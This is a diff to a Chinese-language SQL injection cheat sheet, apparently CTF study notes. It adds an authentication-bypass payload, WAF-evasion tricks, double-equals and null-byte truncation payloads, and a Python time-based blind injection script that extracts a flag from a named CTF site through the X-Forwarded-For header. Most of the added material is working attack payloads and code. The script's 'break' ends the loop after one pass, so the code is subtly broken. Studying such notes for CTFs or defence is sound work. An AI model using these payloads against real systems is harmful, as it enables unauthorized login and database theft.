@@ -1,3 +1,13 @@
+## sql特性
+### sql里面弱类型的比较，以下情况都会为true：
+
+- 1='1'
+- 1='1.0'
+- 1='1后接字母(再后面有数字也可以)'
+- 0='除了 非0数字 开头 的字符串'
+  
+    uname=admin
+    &passwd=admin'||'1'='1
 ## 注入
 
 常用函数：
@@ -14,7 +24,6 @@
     rand() 随机0-1
     concat("abc","123")=abc123
     concat("abc",0x22,"123")=abc"123
-
 ### 手工注入
 
 ```sql
@@ -41,7 +50,26 @@ group_concat()
 --函数让检索出来的语句以行的形式显示。如果不用这个函数，就不会看到输出结果。 
 
 ```
+### 延时注入
+```py
+import requests
+import string
 
+s=requests.session()
+url="http://ctf5.shiyanbar.com/web/wonderkun/index.php"
+
+flag=''
+guess=string.lowercase+string.uppercase+string.digits
+for i in range(33):
+    for st in guess:
+        headers={"x-forwarded-for":"1'+"+"(select case when(substr((select flag from flag) from %d for 1)='%s') then sleep(5) else 1 end) and '1'='1" %(i,st)}
+        try:
+          res=s.get(url,headers=headers,timeout=4)
+        except requests.exceptions.ReadTimeout:
+            flag+=st
+    print "flag:",flag
+    break
+print "result:"+flag
 
 ### sqlmap  
 
@@ -285,8 +313,14 @@ sqlmap -u http://xxx.asp --cookie "id=114" --level 2
 
 ## 绕过
 
-sql注入绕行waf:；POST ，cookie中转,大小写混合，替换关键字，使用编码，使用注释，等价函数和命令，使用特殊符号，http参数控制，pwn ,select \`version()\`
-sel%00ect,%20=>空格,/!**/ => 空格
+sql注入绕行waf:；POST ，cookie中转,大小写混合，替换关键字，使用编码(16进制，hex编码)，使用注释，等价函数和命令，使用特殊符号，http参数控制，pwn ,select \`version()\`  
+sel%00ect,%20=>空格,/!**/ => 空格  
+### 双等号绕过
+username=p'='&password=p'='  
+
+### 截断
+username=a'+0;%00&password=
+
 
 ## 其他
 
